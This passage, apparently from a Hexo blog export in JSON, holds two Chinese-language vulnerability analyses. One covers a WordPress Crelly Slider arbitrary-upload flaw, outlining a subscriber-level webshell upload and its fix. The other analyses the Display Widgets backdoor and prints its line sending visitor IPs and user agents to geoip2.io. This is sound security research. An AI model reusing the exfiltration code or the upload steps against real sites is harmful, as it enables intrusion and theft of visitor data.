admin/admin-ajax.php文件，如下图\n\n![MvQv3d.png](https://s2.ax1x.com/2019/11/25/MvQv3d.png)\n\n可见上图17-19行，使用常量WP_ADMIN来标识这是一个后台文件\n\n这就导致了无论什么身份的用户，只要访问后台文件，is_admin方法都会返回true\n\n我们新建一个名为subscriber的用户，其权限为订阅者权限(subscriber)\n\n![MvlCHf.png](https://s2.ax1x.com/2019/11/25/MvlCHf.png)\n\n在wordpress中，订阅者权限具有极低的权限：\n\n“具有订阅者用户角色的用户可以登录WordPress站点并更新自己的配置。他们可以根据需要更改密码。订阅者用户角色无法在WordPress管理后台内撰写文章，查看评论或执行任何其他操作。订阅者用户角色无权访问设置，插件或主题，因此无法更改网站上的任何设置”\n\n订阅者wordpress管理页面如下\n\n![MvlZgs.png](https://s2.ax1x.com/2019/11/25/MvlZgs.png)\n\ncrelly-slider插件开发者的本意是希望”is_admin”用户拥有调用crellyslider_importSlider ajax接口的权限，但实际上，subscriber身份的用户仍有权限使用crellyslider_importSlider ajax接口上传压缩包并将其中内容解压到/wordpress/temp/路径中\n\n在我们构造的webshell.php文件中写入如下代码\n\n![MvlECQ.png](https://s2.ax1x.com/2019/11/25/MvlECQ.png)\n\n并将其压缩至webshell.zip中\n\n![Mvlnuq.png](https://s2.ax1x.com/2019/11/25/Mvlnuq.png)\n\n使用subscriber身份的用户的cookie，发送如下POST请求\n\n![Mvlk4g.png](https://s2.ax1x.com/2019/11/25/Mvlk4g.png)\n\nwebshell.zip 中的webshell.php将会被解压到wordpress\\\\temp目录下，如下图\n\n![MvQxgA.png](https://s2.ax1x.com/2019/11/25/MvQxgA.png)\n\n通过访问这个地址，webshell.php中的内容将会被执行\n\n## 漏洞修复\n\n关于本次漏洞的修复如下：\n\n在crellyslider.php中定义了一个值为manage_options的CS_MIN_CAPABILITY常量\n\n![MvQO4e.png](https://s2.ax1x.com/2019/11/25/MvQO4e.png)\n\n在crellyslider.php调用ajax.php中crellyslider_addSlider_callback方法时，调用current_user_can方法验证当前用户是否具有manage_options权限，如下图\n\n![MvlFUS.png](https://s2.ax1x.com/2019/11/25/MvlFUS.png)\n\n这样就可以避免没有访问插件和主题选项页面权限的用户身份(例如订阅者身份)调用crellyslider_addSlider_callback方法上传文件。","slug":"wordpress-crelly-slider","published":1,"updated":"2020-10-27T09:27:09.784Z","_id":"ckgrozua6005dwsa9gng71cy6","comments":1,"layout":"post","photos":[],"link":"","content":"<!--[![Mv8Kbt.md.jpg](https://s2.ax1x.com/2019/11/25/Mv8Kbt.md.jpg)](https://imgchr.com/i/Mv8Kbt)\n\n-->\n\n<p>WordPress Crelly Slider是一个开源的幻灯片插件。用户可以使用强大的拖放生成器来添加文本、图像、youtube/vimeo视频，并为每个视频制作动画。</p>\n<p>WordPress Crelly Slider插件具有20,000多个活动安装。该插件在1.3.4及更低版本中出现任意文件上传漏洞。任意经过身份验证的用户（例如订阅者身份）可通过向wp_ajax_crellyslider_importSlider发送带有恶意PHP文件的ZIP压缩文件来利用该漏洞上传文件并将恶意PHP文件解压到插件目录中。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在crelly-slider\\crellyslider.php文件中，存在如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvlV3j.png\" alt=\"MvlV3j.png\"></p>\n<p>位于上图45行处可见，插件使用if(is_admin())进行判断，满足条件则可以进入上图if分支，并且在58行处将wordpress/ajax.php文件包含进来</p>\n<p>接着来分析下ajax.php文件</p>\n<p>在crelly-slider/wordpress/ajax.php中存在如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvluD0.png\" alt=\"MvluD0.png\"></p>\n<p>可见上图520行处注册了一个名为wp_ajax_crellyslider_importSlider 的ajax action并指向ajax.php中的crellyslider_importSlider_callback方法。</p>\n<p>在wordpress插件调用机制里，crellyslider_importSlider_callback方法可以通过构造”<a href=\"http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider%E2%80%9D%E8%BF%99%E6%A0%B7%E7%9A%84url%E6%9D%A5%E8%AE%BF%E9%97%AE\">http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider”这样的url来访问</a></p>\n<p>具体调用链如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/Mvl9DP.png\" alt=\"Mvl9DP.png\"></p>\n<p>在搞清楚crellyslider_importSlider_callback方法是如何通过url调用后，继续分析crellyslider_importSlider_callback方法</p>\n<p>在crellyslider_importSlider_callback方法中523行处使用crellyslider_importSlider方法来处理上传文件，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvQj9H.png\" alt=\"MvQj9H.png\"></p>\n<p>接着来看下crellyslider_importSlider方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/Mvlevn.png\" alt=\"Mvlevn.png\"></p>\n<p>crellyslider_importSlider方法将上传zip文件解压，并将解压后的文件存储于/wordpress/temp/路径中，如上图553行红框处</p>\n<p>现在梳理一下上文介绍的流程：</p>\n<p>crelly-slider插件将使用is_admin()方法验证用户是否有使用crellyslider_importSlider_callback方法的使用权限。通过is_admin()方法验证的用户则可以使用crellyslider_importSlider_callback方法上传任意zip压缩包，程序将上传的压缩包中的文件解压至/wordpress/temp/路径。</p>\n<p>能使整个流程执行的前提是通过is_admin()的校验。但是is_admin()方法具体是做什么的呢？它是否像字面上看起来的那样：判断用户是否是管理员身份吗？——答案是否定的。</p>\n<p>is_admin方法只是用来确定当前请求是否是针对管理界面页面。使用if(is_admin())只是为了确保if条件中的代码在后端管理界面加载，而不会再前台管理界面加载</p>\n<p>is_admin方法并没有核实用户是否是管理员身份的能力，其代码如下图:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/Mvlput.png\" alt=\"Mvlput.png\"></p>\n<p>因此crelly-slider插件开发者误用了is_admin方法，错误的将其用来判断当前操作的用户身份是否为管理员身份。</p>\n<p>事实上，只要是是后台文件，都会定义WP_ADMIN常量为true，例如本次漏洞的入口：wp-admin/admin-ajax.php文件，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvQv3d.png\" alt=\"MvQv3d.png\"></p>\n<p>可见上图17-19行，使用常量WP_ADMIN来标识这是一个后台文件</p>\n<p>这就导致了无论什么身份的用户，只要访问后台文件，is_admin方法都会返回true</p>\n<p>我们新建一个名为subscriber的用户，其权限为订阅者权限(subscriber)</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvlCHf.png\" alt=\"MvlCHf.png\"></p>\n<p>在wordpress中，订阅者权限具有极低的权限：</p>\n<p>“具有订阅者用户角色的用户可以登录WordPress站点并更新自己的配置。他们可以根据需要更改密码。订阅者用户角色无法在WordPress管理后台内撰写文章，查看评论或执行任何其他操作。订阅者用户角色无权访问设置，插件或主题，因此无法更改网站上的任何设置”</p>\n<p>订阅者wordpress管理页面如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvlZgs.png\" alt=\"MvlZgs.png\"></p>\n<p>crelly-slider插件开发者的本意是希望”is_admin”用户拥有调用crellyslider_importSlider ajax接口的权限，但实际上，subscriber身份的用户仍有权限使用crellyslider_importSlider ajax接口上传压缩包并将其中内容解压到/wordpress/temp/路径中</p>\n<p>在我们构造的webshell.php文件中写入如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvlECQ.png\" alt=\"MvlECQ.png\"></p>\n<p>并将其压缩至webshell.zip中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/Mvlnuq.png\" alt=\"Mvlnuq.png\"></p>\n<p>使用subscriber身份的用户的cookie，发送如下POST请求</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/Mvlk4g.png\" alt=\"Mvlk4g.png\"></p>\n<p>webshell.zip 中的webshell.php将会被解压到wordpress\\temp目录下，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvQxgA.png\" alt=\"MvQxgA.png\"></p>\n<p>通过访问这个地址，webshell.php中的内容将会被执行</p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>关于本次漏洞的修复如下：</p>\n<p>在crellyslider.php中定义了一个值为manage_options的CS_MIN_CAPABILITY常量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvQO4e.png\" alt=\"MvQO4e.png\"></p>\n<p>在crellyslider.php调用ajax.php中crellyslider_addSlider_callback方法时，调用current_user_can方法验证当前用户是否具有manage_options权限，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/25/MvlFUS.png\" alt=\"MvlFUS.png\"></p>\n<p>这样就可以避免没有访问插件和主题选项页面权限的用户身份(例如订阅者身份)调用crellyslider_addSlider_callback方法上传文件。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg","excerpt":"<!--[![Mv8Kbt.md.jpg](https://s2.ax1x.com/2019/11/25/Mv8Kbt.md.jpg)](https://imgchr.com/i/Mv8Kbt)\n\n-->\n\n<p>WordPress Crelly Slider是一个开源的幻灯片插件。用户可以使用强大的拖放生成器来添加文本、图像、youtube/vimeo视频，并为每个视频制作动画。</p>\n<p>WordPress Crelly Slider插件具有20,000多个活动安装。该插件在1.3.4及更低版本中出现任意文件上传漏洞。任意经过身份验证的用户（例如订阅者身份）可通过向wp_ajax_crellyslider_importSlider发送带有恶意PHP文件的ZIP压缩文件来利用该漏洞上传文件并将恶意PHP文件解压到插件目录中。</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在crelly-slider\\crellyslider.php文件中，存在如下代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvlV3j.png\" alt=\"MvlV3j.png\"></p>\n<p>位于上图45行处可见，插件使用if(is_admin())进行判断，满足条件则可以进入上图if分支，并且在58行处将wordpress/ajax.php文件包含进来</p>\n<p>接着来分析下ajax.php文件</p>\n<p>在crelly-slider/wordpress/ajax.php中存在如下代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvluD0.png\" alt=\"MvluD0.png\"></p>\n<p>可见上图520行处注册了一个名为wp_ajax_crellyslider_importSlider 的ajax action并指向ajax.php中的crellyslider_importSlider_callback方法。</p>\n<p>在wordpress插件调用机制里，crellyslider_importSlider_callback方法可以通过构造”<a href=\"http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider%E2%80%9D%E8%BF%99%E6%A0%B7%E7%9A%84url%E6%9D%A5%E8%AE%BF%E9%97%AE\">http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider”这样的url来访问</a></p>\n<p>具体调用链如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/Mvl9DP.png\" alt=\"Mvl9DP.png\"></p>\n<p>在搞清楚crellyslider_importSlider_callback方法是如何通过url调用后，继续分析crellyslider_importSlider_callback方法</p>\n<p>在crellyslider_importSlider_callback方法中523行处使用crellyslider_importSlider方法来处理上传文件，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvQj9H.png\" alt=\"MvQj9H.png\"></p>\n<p>接着来看下crellyslider_importSlider方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/Mvlevn.png\" alt=\"Mvlevn.png\"></p>\n<p>crellyslider_importSlider方法将上传zip文件解压，并将解压后的文件存储于/wordpress/temp/路径中，如上图553行红框处</p>\n<p>现在梳理一下上文介绍的流程：</p>\n<p>crelly-slider插件将使用is_admin()方法验证用户是否有使用crellyslider_importSlider_callback方法的使用权限。通过is_admin()方法验证的用户则可以使用crellyslider_importSlider_callback方法上传任意zip压缩包，程序将上传的压缩包中的文件解压至/wordpress/temp/路径。</p>\n<p>能使整个流程执行的前提是通过is_admin()的校验。但是is_admin()方法具体是做什么的呢？它是否像字面上看起来的那样：判断用户是否是管理员身份吗？——答案是否定的。</p>\n<p>is_admin方法只是用来确定当前请求是否是针对管理界面页面。使用if(is_admin())只是为了确保if条件中的代码在后端管理界面加载，而不会再前台管理界面加载</p>\n<p>is_admin方法并没有核实用户是否是管理员身份的能力，其代码如下图:</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/Mvlput.png\" alt=\"Mvlput.png\"></p>\n<p>因此crelly-slider插件开发者误用了is_admin方法，错误的将其用来判断当前操作的用户身份是否为管理员身份。</p>\n<p>事实上，只要是是后台文件，都会定义WP_ADMIN常量为true，例如本次漏洞的入口：wp-admin/admin-ajax.php文件，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvQv3d.png\" alt=\"MvQv3d.png\"></p>\n<p>可见上图17-19行，使用常量WP_ADMIN来标识这是一个后台文件</p>\n<p>这就导致了无论什么身份的用户，只要访问后台文件，is_admin方法都会返回true</p>\n<p>我们新建一个名为subscriber的用户，其权限为订阅者权限(subscriber)</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvlCHf.png\" alt=\"MvlCHf.png\"></p>\n<p>在wordpress中，订阅者权限具有极低的权限：</p>\n<p>“具有订阅者用户角色的用户可以登录WordPress站点并更新自己的配置。他们可以根据需要更改密码。订阅者用户角色无法在WordPress管理后台内撰写文章，查看评论或执行任何其他操作。订阅者用户角色无权访问设置，插件或主题，因此无法更改网站上的任何设置”</p>\n<p>订阅者wordpress管理页面如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvlZgs.png\" alt=\"MvlZgs.png\"></p>\n<p>crelly-slider插件开发者的本意是希望”is_admin”用户拥有调用crellyslider_importSlider ajax接口的权限，但实际上，subscriber身份的用户仍有权限使用crellyslider_importSlider ajax接口上传压缩包并将其中内容解压到/wordpress/temp/路径中</p>\n<p>在我们构造的webshell.php文件中写入如下代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvlECQ.png\" alt=\"MvlECQ.png\"></p>\n<p>并将其压缩至webshell.zip中</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/Mvlnuq.png\" alt=\"Mvlnuq.png\"></p>\n<p>使用subscriber身份的用户的cookie，发送如下POST请求</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/Mvlk4g.png\" alt=\"Mvlk4g.png\"></p>\n<p>webshell.zip 中的webshell.php将会被解压到wordpress\\temp目录下，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvQxgA.png\" alt=\"MvQxgA.png\"></p>\n<p>通过访问这个地址，webshell.php中的内容将会被执行</p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>关于本次漏洞的修复如下：</p>\n<p>在crellyslider.php中定义了一个值为manage_options的CS_MIN_CAPABILITY常量</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvQO4e.png\" alt=\"MvQO4e.png\"></p>\n<p>在crellyslider.php调用ajax.php中crellyslider_addSlider_callback方法时，调用current_user_can方法验证当前用户是否具有manage_options权限，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/25/MvlFUS.png\" alt=\"MvlFUS.png\"></p>\n<p>这样就可以避免没有访问插件和主题选项页面权限的用户身份(例如订阅者身份)调用crellyslider_addSlider_callback方法上传文件。</p>"},{"title":"WordPress的Display Widgets插件后门分析","date":"2017-09-15T07:30:47.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nDisplay Widgets是WordPress一款插件，大约有200,000站点在使用该插件。最近，Display Widgets被发现存在有后门代码。该后门用于上传数据到第三方服务器，上传的数据包括用户IP地址，UA标识等。本文是对此后门的技术分析。\n\n<!--more-->\n\n## 后门分析\n\nDisplay Widgets安装后如下图\n\n** ![](http://blog.nsfocus.net/wp-content/uploads/2017/09/6f7efd8d362095b06add06300699d152.png)**\n\n在没有安装Display Widgets插件，Widgets原来的样子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/e2509aac2db597ea58b6aef3546c9d0c.png)\n\nDisplay Widgets插件开启后的样子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/40ef6b1571d2a66c88c48e2755e85553.png)\n\nDisplay Widgets插件扩展了小工具的功能.\n\n虽然这个插件是在后台进行操作配置的，但是我们在浏览wordpress前端网页时，这个插件仍然可被加载.\n\n我们访问一下wordpress文章页面，并在后门处下断\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1a0f108099c56002441f725d7804acb2.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/70a49c9b17f9418d5234db3e3aee3fab.png)\n\n在后门文件上下断点，访问前端文章页面，被断下，证明此时后门已经加载了。\n\n下面我们分析下这个后门。\n\n这个后门文件名为geolocation.php，在插件安装后位于wp-content/plugins/display-widgets/文件夹中\n\n发现代码中有多处wp_remote_get()方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/a100bea80b8b74c45ae65fb027a3007c.png)\n\n这个方法是用来向外发送get请求的，如下图所示：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/9ab6c5489de13641cece3f0546cf1c21.png)\n\n而且插件代码调用这个方法向外发送一个可疑的request_url参数，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/53782c0d853c4929930720b1f985d95f.png)\n\n$request_url = 'http://geoip2.io/api/update/?url=' . _urlencode_( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&amp;agent=' . _urlencode_( self::get_user_agent() ) . '&amp;geo=true&amp;p=9&amp;v=0&amp;ip=' . _urlencode_( $_SERVER[ 'REMOTE_ADDR' ] ) . '&amp;siteurl=' . _urlencode_( get_site_url() );\n\n因此这处怀疑是一处后门。\n\n我们分析下这个request_url参数都向外发送了什么，下面具体分析下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/50af7f673213b16417f0aa6290d2ec02.png)\n\nrequest_url这个参数拼接了一个地址，并向这个地址通过get主要提交了url参数、agent参数和siteurl参数。\n\n我们看一下这三个参数中泄露了什么信息\n\n**先看url****参数中：**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/f22cb75bb40b49ed3ee4ab06f71c4e4b.png)\n\n参数中的第一处调用了get_protocol()方法，，我们看下get_protocol方法，如下所示：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/0bc903e80ce4d5ee28a9757324f5c8fe.png)\n\n这个方法是用来判断网址是否是https的\n\n然后紧接着拼接了一个$_SERVER[ 'HTTP_HOST' ] 和$_SERVER[ 'REQUEST_URI' ]组成了url参数\n\n**再看agent****参数中：**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/87af809283644f1b9a86d5d0e17ee9f3.png)\n\n包含了user_agent和$_SERVER[ 'REMOTE_ADDR' ]\n\nget_user_agent方法如下所示，这个方法返回了$_SERVER[ 'HTTP_USER_AGENT' ] 的值\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/0c4c0b4eeea0b2faef852eead31568cb.png)\n\n**最后看siteurl****参数中：**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1163b4162e19a41a6f663fbe050350bd.png)\n\n包含了网站的地址。\n\n这些信息最终通过wp_remote_get方法被发送给了[http://geoip2.io](http://geoip2.io)这个站，如下图所示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/bb3fe8542d80a2a0a86ba92d1b5b2a4d.png)\n\n那代码中一共有多少处发送请求的地方呢？\n\n一共用三处，这三处发送的内容一样，就是上文所分析的内容。\n\n首先第一处在get_country方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/eddf14e841860555304ff5cadd78721c.png)\n\n这个方法在display-widgets.php（插件主文件）中show_geolocation方法中被使用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/c82dd71a1726ca6ffe3156832907b5fd.png)\n\n第二处、第三次都在在check_query_string方法中，如下代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/4ff5ad5b8ebf19cc55149c3618abf715.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/344972d15831b3a29c45032474463074.png)\n\ncheck_query_string方法在wp动作执行时被触发时被调用，如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1ab63e04e1bf5d775326d93c16401bf0.png)\n\n而Wp动作意思是在wp项目被启动\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/69b8e0ee6fc49c154ba441dfd405fd8f.png)\n\n另外，这个文件中还有个get_remote_ip方法，但是这个并没有被调用，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/126a377ea229d9dba12e9980931ce2b0.png)\n\n&nbsp;\n\n虽然没有被调用，但仍然可以看出这个方法是返回$_SERVER[ 'REMOTE_ADDR' ]值用的，如下图，因为是本地测试，值是127.0.0.1\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/615866e907208464e0dd84ce681b9984.png)\n\n## <span id=\"i-14\" class=\"ez-toc-section\">声 明</span>\n\n本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。\n\n## <span id=\"i-15\" class=\"ez-toc-section\">关于绿盟科技</span>\n\n北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。\n\n基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。\n\n北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169\n直接询问：010-68438880\n\n&nbsp;","source":"_posts/wordpress-display-widgets-backdoor-analysis.md","raw":"---\ntitle: WordPress的Display Widgets插件后门分析\ndate: 2017-09-15 15:30:47\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nDisplay Widgets是WordPress一款插件，大约有200,000站点在使用该插件。最近，Display Widgets被发现存在有后门代码。该后门用于上传数据到第三方服务器，上传的数据包括用户IP地址，UA标识等。本文是对此后门的技术分析。\n\n<!--more-->\n\n## 后门分析\n\nDisplay Widgets安装后如下图\n\n** ![](http://blog.nsfocus.net/wp-content/uploads/2017/09/6f7efd8d362095b06add06300699d152.png)**\n\n在没有安装Display Widgets插件，Widgets原来的样子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/e2509aac2db597ea58b6aef3546c9d0c.png)\n\nDisplay Widgets插件开启后的样子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/40ef6b1571d2a66c88c48e2755e85553.png)\n\nDisplay Widgets插件扩展了小工具的功能.\n\n虽然这个插件是在后台进行操作配置的，但是我们在浏览wordpress前端网页时，这个插件仍然可被加载.\n\n我们访问一下wordpress文章页面，并在后门处下断\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1a0f108099c56002441f725d7804acb2.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/70a49c9b17f9418d5234db3e3aee3fab.png)\n\n在后门文件上下断点，访问前端文章页面，被断下，证明此时后门已经加载了。\n\n下面我们分析下这个后门。\n\n这个后门文件名为geolocation.php，在插件安装后位于wp-content/plugins/display-widgets/文件夹中\n\n发现代码中有多处wp_remote_get()方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/a100bea80b8b74c45ae65fb027a3007c.png)\n\n这个方法是用来向外发送get请求的，如下图所示：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/9ab6c5489de13641cece3f0546cf1c21.png)\n\n而且插件代码调用这个方法向外发送一个可疑的request_url参数，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/53782c0d853c4929930720b1f985d95f.png)\n\n$request_url = 'http://geoip2.io/api/update/?url=' . _urlencode_( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&amp;agent=' . _urlencode_( self::get_user_agent() ) . '&amp;geo=true&amp;p=9&amp;v=0&amp;ip=' . _urlencode_( $_SERVER[ 'REMOTE_ADDR' ] ) . '&amp;siteurl=' . _urlencode_( get_site_url() );\n\n因此这处怀疑是一处后门。\n\n我们分析下这个request_url参数都向外发送了什么，下面具体分析下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/50af7f673213b16417f0aa6290d2ec02.png)\n\nrequest_url这个参数拼接了一个地址，并向这个地址通过get主要提交了url参数、agent参数和siteurl参数。\n\n我们看一下这三个参数中泄露了什么信息\n\n**先看url****参数中：**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/f22cb75bb40b49ed3ee4ab06f71c4e4b.png)\n\n参数中的第一处调用了get_protocol()方法，，我们看下get_protocol方法，如下所示：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/0bc903e80ce4d5ee28a9757324f5c8fe.png)\n\n这个方法是用来判断网址是否是https的\n\n然后紧接着拼接了一个$_SERVER[ 'HTTP_HOST' ] 和$_SERVER[ 'REQUEST_URI' ]组成了url参数\n\n**再看agent****参数中：**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/87af809283644f1b9a86d5d0e17ee9f3.png)\n\n包含了user_agent和$_SERVER[ 'REMOTE_ADDR' ]\n\nget_user_agent方法如下所示，这个方法返回了$_SERVER[ 'HTTP_USER_AGENT' ] 的值\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/0c4c0b4eeea0b2faef852eead31568cb.png)\n\n**最后看siteurl****参数中：**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1163b4162e19a41a6f663fbe050350bd.png)\n\n包含了网站的地址。\n\n这些信息最终通过wp_remote_get方法被发送给了[http://geoip2.io](http://geoip2.io)这个站，如下图所示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/bb3fe8542d80a2a0a86ba92d1b5b2a4d.png)\n\n那代码中一共有多少处发送请求的地方呢？\n\n一共用三处，这三处发送的内容一样，就是上文所分析的内容。\n\n首先第一处在get_country方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/eddf14e841860555304ff5cadd78721c.png)\n\n这个方法在display-widgets.php（插件主文件）中show_geolocation方法中被使用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/c82dd71a1726ca6ffe3156832907b5fd.png)\n\n第二处、第三次都在在check_query_string方法中，如下代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/4ff5ad5b8ebf19cc55149c3618abf715.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/344972d15831b3a29c45032474463074.png)\n\ncheck_query_string方法在wp动作执行时被触发时被调用，如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1ab63e04e1bf5d775326d93c16401bf0.png)\n\n而Wp动作意思是在wp项目被启动\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/69b8e0ee6fc49c154ba441dfd405fd8f.png)\n\n另外，这个文件中还有个get_remote_ip方法，但是这个并没有被调用，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/126a377ea229d9dba12e9980931ce2b0.png)\n\n&nbsp;\n\n虽然没有被调用，但仍然可以看出这个方法是返回$_SERVER[ 'REMOTE_ADDR' 